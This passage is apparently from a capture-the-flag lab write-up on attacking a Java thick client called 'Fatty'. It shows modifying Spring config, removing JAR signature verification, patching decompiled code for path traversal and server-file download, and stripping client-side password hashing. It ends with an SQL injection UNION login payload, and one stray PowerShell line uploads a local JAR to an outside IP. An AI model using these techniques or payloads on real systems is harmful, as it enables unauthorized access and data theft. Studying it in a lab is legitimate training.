        constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
        <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
            <property name = "keystorePath" value = "fatty.p12"/>
        </bean>

        <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
            <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
        </bean>

        <!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val -->
        <bean id="connection" class = "htb.fatty.client.connection.Connection">
            <constructor-arg index = "0" ref = "connectionContext"/>
            <constructor-arg index = "1" ref = "trustedFatty"/>
            <constructor-arg index = "2" ref = "secretHolder"/>
        </bean>

        </beans>
        ```
        We need to edit this line, from this:

        ```xml
        <constructor-arg index="1" value = "8000"/>
        ```
        To this:
        ```xml
        <constructor-arg index="1" value = "1337"/>
        ```
    2. Disabling JAR Integrity Verification

        We need to modify **META-INF/MANIFEST.MF** because this JAR is validating every file's SHA-256 hashes before running. Here the modifed MANIFEST.MF looks like:

        ```txt
        Manifest-Version: 1.0
        Archiver-Version: Plexus Archiver
        Built-By: root
        Sealed: True
        Created-By: Apache Maven 3.3.9
        Build-Jdk: 1.8.0_232
        Main-Class: htb.fatty.client.run.Starter

        ```
        Then, we need to delet the **META-INF/1.RSA** and **META-INF/1.SF**. After that, we can build the .jar.

        ```powershell
        jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar * 
        ```

        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 2.png>)

        We can see that we have successful login. But we cant still click server status -> ipconfig
    
    3. Decompile by using JD-GUI

        Select fatty-client-new.jar in JD-GUI. Then, select Save All Sources. After that, we can extract the zip file of it.


        (New-Object System.Net.WebClient).UploadFile('http://10.10.14.131:8000/upload.php', 'C:\Apps\fatty-client.jar')
    
    4. Enable Path Traversal (Modify ClientGuiTest.java)

        Trick the client into showing us the files in the parent directory (..) instead of the locked configs folder. We need to edit ClientGuiTest.java. Modify configs.addActionListener from this:


        ```java
        /* 368 */     configs.addActionListener(new ActionListener()
        /*     */         {
        /*     */           public void actionPerformed(ActionEvent e) {
        /* 371 */             String response = "";
        /* 372 */             ClientGuiTest.this.currentFolder = "configs";
        /*     */             try {
        /* 374 */               response = ClientGuiTest.this.invoker.showFiles("configs");
        /* 375 */             } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
        /* 376 */               JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
        /*     */ 
        /*     */             
        /*     */             }
        /* 380 */             catch (IOException e2) {
        /* 381 */               JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
        /*     */             } 
        /*     */ 
        /*     */ 
        /*     */             
        /* 386 */             textPane.setText(response);
        /*     */           }
        /*     */         });
        ```

        To this:

        ```java
                /* 368 */     configs.addActionListener(new ActionListener()
        /*     */         {
        /*     */           public void actionPerformed(ActionEvent e) {
        /* 371 */             String response = "";
        /* 372 */             ClientGuiTest.this.currentFolder = "..";
        /*     */             try {
        /* 374 */               response = ClientGuiTest.this.invoker.showFiles("..");
        /* 375 */             } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
        /* 376 */               JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
        /*     */ 
        /*     */             
        /*     */             }
        /* 380 */             catch (IOException e2) {
        /* 381 */               JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
        /*     */             } 
        /*     */ 
        /*     */ 
        /*     */             
        /* 386 */             textPane.setText(response);
        /*     */           }
        /*     */         });
        ```
        After that, compile the ClientGuiTest.Java file and do this command. This command will guide until create traverse.jar.

        ```powershell
        javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
        mkdir raw
        cp fatty-client-new.jar raw\fatty-client-new-2.jar
        mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
        cd raw
        jar -cmf META-INF\MANIFEST.MF traverse.jar .
        ```
        Then open traverse.jar.

        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 3.png>)

        Now, we can see the content of the configs/../ by go to FileBrowser -> Config.
    
    5. Modify Invoker.java to Download file from the server (fatty-server.jar file)

        We need to modify open function the Invoker.java file. Replace the open function with this:

        ```java
        import java.io.FileOutputStream;
        
        <snip>
        
        public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
            String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
            logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
            if (AccessCheck.checkAccess(methodName, this.user)) {
                return "Error: Method '" + methodName + "' is not allowed for this user account";
            }
            this.action = new ActionMessage(this.sessionID, "open");
            this.action.addArgument(foldername);
            this.action.addArgument(filename);
            sendAndRecv();
            String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
            FileOutputStream fos = new FileOutputStream(desktopPath);
            
            if (this.response.hasError()) {
                return "Error: Your action caused an error on the application server!";
            }
            
            byte[] content = this.response.getContent();
            fos.write(content);
            fos.close();
            
            return "Successfully saved the file to " + desktopPath;
        }
        ``` 
        Then, we can rebuild again. 

        ```powershell
        javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\methods\Invoker.java
        cp fatty-client-new.jar raw\fatty-client-new-3.jar
        mv -Force fatty-client-new.jar.src\htb\fatty\client\methods\*.class raw\htb\fatty\client\methods\
        cd raw
        jar -cmf META-INF\MANIFEST.MF open.jar .
        ```
        Then we can open open.jar. After logged in, go to ServerStatus -> config and type fatty-server.jar in the open field.

        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 4.png>)

        It should be look like this if success.

        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 5.png>)

    6. Disable Password Hashing (Modify User.java)

        The fatty-server.jar analysis revealed an SQL Injection vulnerability, but it requires us to send a plain password. The client currently hashes passwords (SHA-256), which breaks our attack. We must disable that. We can modify user.java. Replace this function:

        ```java
        /*     */   public User(int uid, String username, String password, String email, Role role) {
        /*  20 */     this.uid = uid;
        /*  21 */     this.username = username;
        /*     */     
        /*  23 */     String hashString = this.username + password + "clarabibimakeseverythingsecure";
        /*  24 */     MessageDigest digest = null;
        /*     */     try {
        /*  26 */       digest = MessageDigest.getInstance("SHA-256");
        /*  27 */     } catch (NoSuchAlgorithmException e) {
        /*  28 */       e.printStackTrace();
        /*     */     } 
        /*  30 */     byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
        /*     */     
        /*  32 */     this.password = DatatypeConverter.printHexBinary(hash);
        /*  33 */     this.email = email;
        /*  34 */     this.role = role;
        /*     */   }
        ```
        With this:

        ```java
        public User(int uid, String username, String password, String email, Role role) {
            this.uid = uid;
            this.username = username;
            this.password = password;
            this.email = email;
            this.role = role;
        }
        ```

        And this function:

        ```java
        /*     */   public void setPassword(String password) {
        /*  76 */     String hashString = this.username + password + "clarabibimakeseverythingsecure";
        /*  77 */     MessageDigest digest = null;
        /*     */     try {
        /*  79 */       digest = MessageDigest.getInstance("SHA-256");
        /*  80 */     } catch (NoSuchAlgorithmException e) {
        /*  81 */       e.printStackTrace();
        /*     */     } 
        /*  83 */     byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
        /*  84 */     this.password = DatatypeConverter.printHexBinary(hash);
        /*     */   }
        ```
        With this:
        
        ```java
        public void setPassword(String password) {
            this.password = password;
        }
        ```
        Then, we can rebuild again.

        ```powershell
        javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\shared\resources\User.java
        mv -Force fatty-client-new.jar.src\htb\fatty\shared\resources\User.class raw\htb\fatty\shared\resources\
        cd raw
        jar -cmf META-INF\MANIFEST.MF fatty-client-final.jar .
        ```
        After that, we can login again by using this payload.

        - Username  : `abc' UNION SELECT 1,'abc','a@b.com','abc','admin`
        - password  : `abc `

        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 6.png>)

        We can see that we have successfully logged in. Now, we can click ServerStatus -> ipconfig.

        ![alt text](<Assets/Exploiting Web Vulnerabilities in Thick-Client Applications - 7.png>)

        The answer is `172.28.0.3`.


